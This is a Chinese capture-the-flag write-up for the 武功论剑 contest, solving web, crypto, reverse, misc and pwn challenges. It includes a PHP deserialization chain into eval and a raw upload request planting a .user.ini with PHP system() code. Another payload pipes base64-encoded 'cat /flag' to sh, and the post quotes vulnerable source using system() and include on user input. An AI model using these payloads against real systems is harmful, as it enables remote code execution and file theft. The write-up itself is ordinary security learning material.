---
{"date":"2024-07-26","tags":["安全"],"url":null,"dg-publish":true,"permalink":"/随记/武功论剑WP_{2024-07-26}/","dgPassFrontmatter":true}
---

```table-of-contents
```
# 前言

这次比赛难度较低


```
wget http://59.62.61.30:48304/zhangcheng.txt
```

# 驴友小镇

```hint
书鱼哥哥说这里可能有你想要的答案 flag_is_not_here.php
```
flag就藏在文件源码里面
![Pasted image 20240726224952.png](/img/user/picture/Pasted%20image%2020240726224952.png)


# ⻰溪秘境

```hint
拍照局长：少侠，此题仅凭burp亦能破解！此工具妙用无穷，只需巧妙运用，必能解决难题。愿汝坚定信心，奋力一搏。
```

访问 hint 告知是爆破，同burp的intruder先爆破账号为 test，然后密码为 base64 加密，可采用 burp 的 process 功能，也可以用其他工具代替编码。
![Pasted image 20240726232539.png](/img/user/picture/Pasted%20image%2020240726232539.png)



# 石能为鼓

```hint
乾隆大喜：“石能为鼓，世所罕见！少侠我只是一位NPC，反序列化你应该听说过呀！”
```

首先打开只有一个图片，查看源码发现
`<!--source.php-->`
![Pasted image 20240726233016.png](/img/user/picture/Pasted%20image%2020240726233016.png)

访问看到php代码
```php
<?php  
show_source(__FILE__);  
  
class ping {  
    protected $xiang;  
  
    function __construct() {        $this->xiang = new fun();  
    }  
  
    function __destruct() {        $this->xiang->cp();  
    }  
}  
  
class fun {  
    function cp() {  
        echo "hello";  
    }  
}  
  
class cup {  
    private $data;  
    function cp() {  
        eval($this->data);  
    }  
}  
  
unserialize($_GET['d']);
```

构造反序列化链
```php
<?php  
class ping {  
    protected $xiang;  
    function __construct() {  
        $this->xiang = new cup(); }  
}  
class cup {  
    private $data='phpinfo();';  
}  
$a=new ping();  
echo urlencode(serialize($a));
```

常用方法：
`print_r(scandir("."));`打印文件夹目录
`echo file_get_contents("/flag");`输出文件
`phpinfo()`测试

# 龙池古庙

```hint
郑隐：老夫在此恭候少侠好久了。少侠可知.user.ini的武功秘籍？此文件可用于PHP配置，掌握其内奥，能在Web开发中大展神威，务须细心体悟。
```

利用brup修改上传的包
```
POST / HTTP/1.1
Host: 59.62.61.30:45727
Content-Length: 78158
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://59.62.61.30:45727
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysEFd14FeBFYsqV0l
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://59.62.61.30:45727/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundarysEFd14FeBFYsqV0l
Content-Disposition: form-data; name="file"; filename=".user.ini
Content-Type: image/jpeg

auto_prepend_file=.user.ini
; <?php system('id');?>
------WebKitFormBoundarysEFd14FeBFYsqV0l
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundarysEFd14FeBFYsqV0l--

```

![Pasted image 20240727151529.png](/img/user/picture/Pasted%20image%2020240727151529.png)
访问对应的index.php页面
![a315a5b175bd501e09b4214e87b1fe2.png](/img/user/picture/a315a5b175bd501e09b4214e87b1fe2.png)
发现id可以执行

替换.user.ini内容为
```
auto_prepend_file=.user.ini
; <?php system('echo Y2F0IC9mbGFn | base64 -d | sh');?>
```
经测试上传内容会过滤符号`/`，所以可以进行一下编码
![3b6d185afe3d2940352ce3afad73d73.png](/img/user/picture/3b6d185afe3d2940352ce3afad73d73.png)

拿到flag
![Pasted image 20240727151915.png](/img/user/picture/Pasted%20image%2020240727151915.png)


# 九龙吐水

```hint
罗霄：少侠可知，CE (Cheat Engine) 乃一开源之内存扫描与调试神器。此利器常用于篡改单机游戏之数值，譬如生命值、金钱等。其原理乃通过扫描游戏进程之内存数据，精准定位并修改特定内存地址 ，以达成修改游戏数据之目的。此物妙用无穷，然需谨慎使用，方能恰如其分。
```

提示说可以用CE，这个方法已经做出来了，感觉太简单，就不过多整理了


废了，IDA不会用


# 葛仙炼丹

```hint
葛仙翁：君可曾备有jd-gui之神器？此物可助吾等解密代码，洞悉其间玄机，若有此神器相助，必能事半功倍，解开眼前之难题。
```


**直接解压apk文件，可以查看assets、res等信息。**
~~我也是才知道apk文件可以直接解压~~

- assets
    - 资源文件，如声音、字体等等。
    - 代码中使用AssetsManager获取Assets文件夹的资源。
- lib
    - 存放用C/C++编写的，用NDK编译生成的so文件，供java/kotlin端调用。
- META-INF
    - 存放apk签名信息，用来保证包的完整性和系统的安全。
    - 在IDE编译生成一个apk包时，会对里面所有的文件做一个校验计算，并把计算结果存放在META-INF文件夹内，apk在安装的时候，系统会按照同样的算法对apk包里面的文件做校验，如果结果与META-INF里面的值不一样，系统就不会安装这个apk，这就保证了apk包里的文件不能被随意替换。比如拿到一个apk包后，如果想要替换里面的一幅图片，一段代码， 或一段版权信息，想直接解压缩、替换再重新打包，基本是不可能的。如此一来就给病毒感染和恶意修改增加了难度，有助于保护系统的安全。
- res
    - 存放资源文件，包括icon，xml文件
- AndroidManifest.xml
    - 应用配置文件，每个应用都必须定义和包含，它描述了应用的名字、版本、权限、引用的库等。
- classes.dex
    - 可以直接在Dalvik虚拟机上加载运行的文件，由java/kotlin文件经过IDE编译生成。
    - Dalvik虚拟机的指令码不是标准的Jvm指令码，而是使用了自己独有的一套指令集（类似汇编语言）。
    - dex文件中共用了很多类名称，常量字符串，使它的体积更小，运行效率更高。
- resources.arsc
    - 二进制资源文件，包括字符串等


但其中最主要的是
==**classes.dex：包含Dalvik字节码的文件，是Android应用的可执行文件。**==

使用**dex2jar**将classes.dex文件转化为classes.jar文件
![Pasted image 20240727192436.png](/img/user/picture/Pasted%20image%2020240727192436.png)




使用**jd-gui**- 查看jar源码文件

在源码文件中可以找到下面一段代码：
~~至于怎么找到的，我也不是很懂~~
```java
private boolean checkFlag(String paramString) {  
    int i = paramString.length();  
    if (i != 36)  
      return false;   
    for (byte b = 0; b < i; b++) {  
      (new int[36])[0] = 228;  
      (new int[36])[1] = 127;  
      (new int[36])[2] = 208;  
      (new int[36])[3] = 228;  
      (new int[36])[4] = 152;  
      (new int[36])[5] = 81;  
      (new int[36])[6] = 148;  
      (new int[36])[7] = 213;  
      (new int[36])[8] = 236;  
      (new int[36])[9] = 189;  
      (new int[36])[10] = 182;  
      (new int[36])[11] = 129;  
      (new int[36])[12] = 179;  
      (new int[36])[13] = 92;  
      (new int[36])[14] = 174;  
      (new int[36])[15] = 33;  
      (new int[36])[16] = 12;  
      (new int[36])[17] = 182;  
      (new int[36])[18] = 81;  
      (new int[36])[19] = 1;  
      (new int[36])[20] = 54;  
      (new int[36])[21] = 101;  
      (new int[36])[22] = 21;  
      (new int[36])[23] = 113;  
      (new int[36])[24] = 92;  
      (new int[36])[25] = 184;  
      (new int[36])[26] = 243;  
      (new int[36])[27] = 15;  
      (new int[36])[28] = 74;  
      (new int[36])[29] = 242;  
      (new int[36])[30] = 12;  
      (new int[36])[31] = 225;  
      (new int[36])[32] = 234;  
      (new int[36])[33] = 124;  
      (new int[36])[34] = 179;  
      (new int[36])[35] = 7;  
      (new int[36])[0] = 130;  
      (new int[36])[1] = 19;  
      (new int[36])[2] = 177;  
      (new int[36])[3] = 131;  
      (new int[36])[4] = 227;  
      (new int[36])[5] = 51;  
      (new int[36])[6] = 173;  
      (new int[36])[7] = 183;  
      (new int[36])[8] = 221;  
      (new int[36])[9] = 132;  
      (new int[36])[10] = 132;  
      (new int[36])[11] = 231;  
      (new int[36])[12] = 133;  
      (new int[36])[13] = 58;  
      (new int[36])[14] = 155;  
      (new int[36])[15] = 24;  
      (new int[36])[16] = 57;  
      (new int[36])[17] = 143;  
      (new int[36])[18] = 97;  
      (new int[36])[19] = 55;  
      (new int[36])[20] = 14;  
      (new int[36])[21] = 83;  
      (new int[36])[22] = 39;  
      (new int[36])[23] = 73;  
      (new int[36])[24] = 62;  
      (new int[36])[25] = 142;  
      (new int[36])[26] = 196;  
      (new int[36])[27] = 55;  
      (new int[36])[28] = 121;  
      (new int[36])[29] = 194;  
      (new int[36])[30] = 111;  
      (new int[36])[31] = 131;  
      (new int[36])[32] = 211;  
      (new int[36])[33] = 31;  
      (new int[36])[34] = 138;  
      (new int[36])[35] = 122;  
      if ((paramString.charAt(b) ^ (new int[36])[b]) != (new int[36])[b])  
        return false;   
    }   
    return true;  
  }
```
上面代码大致思路就是有两个数组进行**异或**，而flag值就是这两个数组异或的结果

构造下面代码，保存到文件**Main.java**中
```java
public class Main {
    public static void main(String[] args) {
        int[] arr1 = {228, 127, 208, 228, 152, 81, 148, 213, 236, 189, 182, 129, 179, 92, 174, 33, 12, 182, 81, 1, 54, 101, 21, 113, 92, 184, 243, 15, 74, 242, 12, 225, 234, 124, 179, 7};
        int[] arr2 = {130, 19, 177, 131, 227, 51, 173, 183, 221, 132, 132, 231, 133, 58, 155, 24, 57, 143, 97, 55, 14, 83, 39, 73, 62, 142, 196, 55, 121, 194, 111, 131, 211, 31, 138, 122};

        StringBuilder result = new StringBuilder();
        for (int i = 0; i < arr1.length; i++) {
            result.append((char) (arr1[i] ^ arr2[i]));
        }
        
        System.out.println(result.toString());
    }
}

```

编译并运行：
```shell
javac Main.java
java Main
```

得到flag
![Pasted image 20240727193113.png](/img/user/picture/Pasted%20image%2020240727193113.png)


# 户外天堂（密码学）

```hint
张程大人：或许维吉尼亚密码在比武中能派上用场。这种加密方法通过变换字母顺序和使用不同的密钥，能有效保护通信内容，对于保密传输至关重要，值得深入研究和应用。
```

**题目：**
```txt
kr0gMDY1NTY5MDghNTU5MsozMhU5MzUgNiM3NTI0ODI5MsA2MrE3CmU9NsU1MhcKYz01NTkyOTk4MDM2Mio3Mrg0OTYfODE0OTcfNjUhMiA0MhUiODM=
key:rsa
```

```python
from Crypto.Util.number import *
from base64 import *
from gmpy2 import *

# 扩展密钥函数
def key_extend(key, length):
    Key = key * (length // len(key) + 1)
    return Key[:length]

# 加密函数
def encrypt(message, table, key):
    enc = ''
    Key = key_extend(key, len(message))
    for i in range(len(message)):
        if message[i] not in table:
            enc += message[i]
            continue
        enc += table[(table.index(message[i]) + table.index(Key[i])) % len(table)]
    return enc

# 定义消息、替换表和密钥
message = 'kr0gMDY1NTY5MDghNTU5MsozMhU5MzUgNiM3NTI0ODI5MsA2MrE3CmU9NsU1MhcKYz01NTkyOTk4MDM2Mio3Mrg0OTYfODE0OTcfNjUhMiA0MhUiODM='
table = 'abcdefghijklmnopqrstuvwxyz'
key = 'rsa'

# 加密并输出加密结果
encrypted_message = encrypt(message, table, key)
print("Encrypted message:", encrypted_message)

# Base64 解码并输出解码后的字节数据
try:
    decoded_message_bytes = b64decode(encrypted_message.encode())
    print("Decoded message bytes:", decoded_message_bytes)
except Exception as e:
    print("Error during base64 decoding:", e)

# RSA 参数
p = 1007395600713969067
q = 1057746412436271451
n = 1065569082559283359352737524829206217
e = 65537
c = 557299803638728496181497065330435383

# 计算 phi 和 d
phi = (p - 1) * (q - 1)
d = inverse(e, phi)

# 解密密文并输出结果
decrypted_message = long_to_bytes(pow(c, d, n))
print("Decrypted message:", decrypted_message.decode())

 
```

得到flag
![Pasted image 20240727201632.png](/img/user/picture/Pasted%20image%2020240727201632.png)


# 星空栈道（Misc）

```hint
卢德铭：少侠，汝知否？”逆向“思维乃为关键之道。此种思维方式，可助吾等透过表象，洞悉事物本质，于复杂之境中，寻得解决之策。
```

这题就是将文件的内容进行base64解码，发现是ELF文件，执行后输出flag
```python
import base64

def decode_base64_file(input_file, output_file):
    try:
        with open(input_file, 'r') as f:
            encoded_content = f.read()
        
        decoded_content = base64.b64decode(encoded_content)

        with open(output_file, 'wb') as f:
            f.write(decoded_content)

        print(f"Decoded content saved to {output_file}")
    
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    input_file = 'base.txt'
    output_file = 'output'
    decode_base64_file(input_file, output_file)

```

![Pasted image 20240727203618.png](/img/user/picture/Pasted%20image%2020240727203618.png)


# 龙鳞石阶(Misc)

```hint
武氏夫妇：传说中，存在一种名为DNS Beacon的邪恶力量，它隐藏在网络深处，悄然发送信号，诱使不明之人误入陷阱。
```

有很多 dns 的奇怪请求 发现了很多 basexxx.ctf.org.cn 的请求
![Pasted image 20240727222701.png](/img/user/picture/Pasted%20image%2020240727222701.png)

而且结果是无意义的 127.0.0.1，猜测这是目标服务器被植入了使用 dns 协议的木马，根据 base 的提示，要把请求拼接起来。
或者使用过滤 `dns.flags == 0x8180`

提取域名
```python
from scapy.all import *
import sys

def extract_dns_queries(pcap_file, output_file):
    # Read the pcap file
    packets = rdpcap(pcap_file)
    
    # Open the output file
    with open(output_file, 'w') as f:
        for pkt in packets:
            if pkt.haslayer(DNS) and pkt[DNS].qr == 1:  # Check if it's a DNS response
                dns_layer = pkt.getlayer(DNS)
                if dns_layer.rcode == 0 and dns_layer.ancount > 0:  # Check for no error and answers exist
                    for i in range(dns_layer.ancount):
                        if dns_layer.an[i].type == 1:  # Check if it's a DNS response of type A (host address)
                            query_name = dns_layer.qd.qname.decode('utf-8')
                            f.write(query_name + '\n')

# Usage example
input_pcap = 'attachment.pcapng'
output_txt = 'dns_queries.txt'
extract_dns_queries(input_pcap, output_txt)
print(f"DNS queries with flags 0x8180 have been written to {output_txt}")

```


整理信息并进行base64解码
```python
import base64

def clean_join_and_decode_dns_queries(input_file, output_file):
    with open(input_file, 'r') as f:
        lines = f.readlines()

    cleaned_lines = [line.replace('base', '').replace('.ctf.org.cn.', '').strip() for line in lines]
    joined_line = ''.join(cleaned_lines)

    decoded_data = base64.b64decode(joined_line).decode('utf-8')

    with open(output_file, 'w') as f:
        f.write(decoded_data)

# 使用示例
input_txt = 'dns_queries.txt'
output_txt = 'decoded_dns_queries.txt'
clean_join_and_decode_dns_queries(input_txt, output_txt)
print(f"Cleaned, joined, and decoded DNS queries have been written to {output_txt}")

```

得到flag
![Pasted image 20240727222936.png](/img/user/picture/Pasted%20image%2020240727222936.png)



# 穿云入雾（pwn）

```hint
徐霞客：实际上，真正的探险在于不拘泥于特定工具，而是依靠智慧和勇气，勇往直前，探索未知之境。
//感觉这提示没啥用啊
```

查看里面可读信息
![Pasted image 20240727225300.png](/img/user/picture/Pasted%20image%2020240727225300.png)
发现有`WuGongShan_i_Come`

查看代码逻辑
~~虽然还不知道咋能从一个可执行文件到源码的~~
![Pasted image 20240727225335.png](/img/user/picture/Pasted%20image%2020240727225335.png)


nc后直接输入`WuGongShan_i_Come`
我也真是服了，才知道做pwn题还要nc连接。。。当时傻不拉几的用gdb在调试，搞了半天也没看见flag

![Pasted image 20240727225431.png](/img/user/picture/Pasted%20image%2020240727225431.png)



# 铁蹄关隘(Misc)

```hint
欧阳将军：少侠，汝可知steg86乃一件失传已久之神兵利器。此物威力无穷，若能得此神器相助，必能助汝一臂之力，克服眼前之艰难险阻。望汝能找到此神兵，行走江湖，纵横无敌。
```

就是用steg86对guess进行解码
![Pasted image 20240727235543.png](/img/user/picture/Pasted%20image%2020240727235543.png)

对16进制转化为字符串
得到flag
![Pasted image 20240727235613.png](/img/user/picture/Pasted%20image%2020240727235613.png)


# 金顶绝境
```hint
白鹤真人：倘若将base64进行换表，仍能保持其原本之形乎？
```
用ida，不会，改天看
+ [ ] IDA练习


# 武功论剑

```hint
陈霸先：朕将御驾亲征，如少侠能使用PHP chain与朕同行，必能将那侯景斩于马下
```

源码：
```php
<?php   
show_source(__FILE__);  
if(isset($_GET['file'])){  
    if(preg_match("/flag/i",$_GET['file'])){  
        echo "no way";  
    }  
    else{        $file=$_GET['file'];  
        include_once($file);  
    }  
      
}
```

下面这个或许有用
https://xz.aliyun.com/t/8354?time__1311=n4%2BxnD0DcDuDgADyDjhxBqOorGQCmTnqDtKa84D

~~废了，不会~~


---

# 萍水相逢

```hint
孔子：少侠，你可曾听闻过那“可变函数山”？此山深奥莫测，藏于编程之道，若能掌握其中 精髓，必能在代码之海中游刃有余，纵横捭阖
```




# 禅蕴杨岐

```hint
杨岐禅师：备份文件通常以.xxx.php.swp 的形式存在，这种格式常见于编辑器生成的临时 文件，务必留意以避免信息泄露或文件损坏。
```



# 花炮故里

```hint
李畋：少侠，汝知否？Python 亦能进行逆向解析。若未得其效，或许是工具使用不当也。 若能善用其技，必能破解诸多谜团。
```



# 莲花血鸭

```hint
文天祥：答案自然在动态库中寻觅，探索其中奥秘，方能见解如泉涌。
```




# 仙凤三宝

```hint
刘凤诰：少侠，汝可知 chksum 乃是辨别数据优劣之利器？此手段妙用无穷，可使吾等在数 据海洋中，识别真伪，确保其完整无缺。
```


# 真君擒龙

```hint
许真君：少侠，曾闻 od 这一利器否？此工具非同凡响，能透过分析二进制文件的内容和结 构，揭示其中的奥秘与潜藏的信息，是破解与调试的重要利器，值得深入学习与掌握。
```


源码source.php
```php
<?php  
show_source(__FILE__);  
$cmd=$_GET['cmd'];  
if(isset($cmd)&&strlen($cmd)<6&&!strpos(strtolower($cmd), 'nl')){    system($cmd);  
}else{  
  die("no!no!no!");  
}
```





# 安源路矿

```hint
润之：在处理问题时，专注于堆栈操作，迅速作出决策和行动，这样才能事半功倍，取得更 加显著的成果
```



# 赣西渔米

```hint
文廷式：父子进程的调试需反复斟酌，方能突破难关，确保通畅无阻。只有经过深思熟虑的 调试过程，才能在程序执行中确保稳定性和功能完整性，进而达到预期的效果。
```